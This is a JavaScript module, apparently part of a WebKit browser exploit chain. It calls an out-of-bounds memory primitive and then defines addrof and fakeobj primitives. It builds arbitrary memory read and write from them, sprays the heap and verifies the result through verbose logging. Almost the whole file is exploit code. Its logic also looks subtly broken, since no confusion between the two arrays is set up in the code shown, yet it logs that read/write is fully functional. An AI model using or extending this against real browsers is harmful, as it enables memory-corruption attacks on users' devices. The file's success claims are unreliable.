// js/script3/testArrayBufferVictimCrash.mjs (v101_R61_Verbose - Foco em verificação de primitivas)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Adicionados logs verbosos em todas as etapas críticas para permitir uma verificação
// granular da funcionalidade de cada primitiva (addrof, fakeobj, arb_read, arb_write).
// Inclui um teste de ciclo fechado para addrof/fakeobj e inspeção detalhada do
// objeto "leaker" durante as operações de R/W.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v101_R61_Verbose";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO COM LOGS VERBOSOS)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Verificação Granular de Primitivas ---`, "test");

    let final_result = { success: false, message: "A verificação funcional de L/E falhou." };

    try {
        // --- FASE 1: Obter Primitiva OOB ---
        logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
        logS3("OOB obtida com sucesso. A DataView principal está corrompida e pronta.", "good");

        // --- FASE 2: Criar e Verificar 'addrof' e 'fakeobj' ---
        logS3("--- FASE 2: Criando e Verificando 'addrof'/'fakeobj'... ---", "subtest");
        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        
        const addrof = (obj) => {
            victim_array[0] = obj;
            const addr_double = confused_array[0];
            const addr_int64 = doubleToInt64(addr_double);
            logS3(`[addrof] Objeto -> Addr: ${addr_int64.toString(true)}`, "leak");
            return addr_int64;
        };

        const fakeobj = (addr) => {
            logS3(`[fakeobj] Addr: ${addr.toString(true)} -> Objeto`, "info");
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' definidas.", "good");

        // Verificação de ciclo fechado de addrof/fakeobj
        const test_obj_for_check = { marker: 0xFEEDFACE };
        const test_obj_addr = addrof(test_obj_for_check);
        const recovered_obj = fakeobj(test_obj_addr);
        if (recovered_obj === test_obj_for_check && recovered_obj.marker === 0xFEEDFACE) {
            logS3("-> VERIFICAÇÃO addrof/fakeobj: SUCESSO. Objeto recuperado corretamente.", "vuln");
        } else {
            throw new Error(`A verificação de ciclo addrof/fakeobj falhou. Recuperado: ${recovered_obj}`);
        }

        // --- FASE 3: Construir e Verificar Ferramenta de R/W Arbitrário ---
        logS3("--- FASE 3: Construindo ferramenta de R/W autocontida... ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        const leaker_addr = addrof(leaker);
        // A propriedade 'obj_prop' está no offset 0x10 do objeto 'leaker'
        // A propriedade 'val_prop' está no offset 0x18 do objeto 'leaker'
        logS3(`Objeto 'leaker' criado no endereço: ${leaker_addr.toString(true)}`, "info");
        
        const arb_read_final = (addr) => {
            logS3(`[arb_read] Lendo de: ${addr.toString(true)}`, "debug");
            // Faz com que a propriedade 'obj_prop' do 'leaker' aponte para o endereço alvo 'addr'
            // Isso corrompe o objeto 'leaker', fazendo com que 'val_prop' se sobreponha à memória em 'addr'
            leaker.obj_prop = fakeobj(addr);
            const val_double = leaker.val_prop;
            const val_int64 = doubleToInt64(val_double);
            logS3(`[arb_read]   |-> Valor lido (double): ${val_double}`, "debug");
            logS3(`[arb_read]   |-> Valor retornado (int64): ${val_int64.toString(true)}`, "leak");
            return val_int64;
        };

        const arb_write_final = (addr, value) => {
            logS3(`[arb_write] Escrevendo ${value.toString(true)} em ${addr.toString(true)}`, "debug");
            // Mesma técnica: aponta 'obj_prop' para 'addr'
            leaker.obj_prop = fakeobj(addr);
            const val_double = int64ToDouble(value);
            logS3(`[arb_write]  |-> Convertido para (double): ${val_double}`, "debug");
            // Escreve o valor na propriedade 'val_prop', que na verdade escreve na memória em 'addr'
            leaker.val_prop = val_double;
            logS3(`[arb_write]  |-> Escrita concluída.`, "debug");
        };
        logS3("Primitivas 'arb_read_final' e 'arb_write_final' prontas.", "good");

        // --- FASE 4: Teste Final de Verificação Funcional ---
        logS3("--- FASE 4: Verificação funcional final de R/W... ---", "subtest");
        const spray = [];
        for (let i = 0; i < 1000; i++) spray.push({ a: i, b: 0xCAFEBABE });
        const verification_obj = spray[500];
        logS3(`Objeto de verificação (spray[500]) selecionado. Conteúdo inicial: a=${verification_obj.a}`, "info");

        const verification_obj_addr = addrof(verification_obj);
        // A propriedade 'a' é a primeira, geralmente no offset 0x10 da estrutura do objeto
        const prop_a_addr = new AdvancedInt64(verification_obj_addr.low() + 0x10, verification_obj_addr.high());
        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        
        logS3(`>> Endereço do objeto de verificação: ${verification_obj_addr.toString(true)}`, "info");
        logS3(`>> Endereço da propriedade 'a':       ${prop_a_addr.toString(true)}`, "info");

        logS3(">> PASSO 1: Escrita Arbitrária.", "test");
        arb_write_final(prop_a_addr, value_to_write);

        logS3(">> PASSO 2: Leitura Arbitrária.", "test");
        const value_read_back = arb_read_final(prop_a_addr);

        logS3(`>>>> VALOR ESCRITO:    ${value_to_write.toString(true)}`, "good");
        logS3(`>>>> VALOR LIDO DE VOLTA: ${value_read_back.toString(true)}`, "leak");

        if (value_read_back.equals(value_to_write)) {
            logS3("++++++++++++ SUCESSO! O valor lido corresponde ao valor escrito. R/W Arbitrário é 100% funcional. ++++++++++++", "vuln");
            // Teste final: ler a propriedade diretamente do objeto para ver se o valor foi alterado
            const direct_read_val = verification_obj.a;
            logS3(`>> Leitura direta de 'verification_obj.a' retorna: ${direct_read_val} (tipo: ${typeof direct_read_val})`, "info");
            logS3("-> O valor pode não ser representável como um número JS padrão, o que é esperado.", "info");

            final_result = {
                success: true,
                message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada com logs detalhados."
            };
        } else {
            throw new Error(`A verificação de R/W falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read_back.toString(true)}`);
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional e verificada." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified Verbose)' }
    };
}
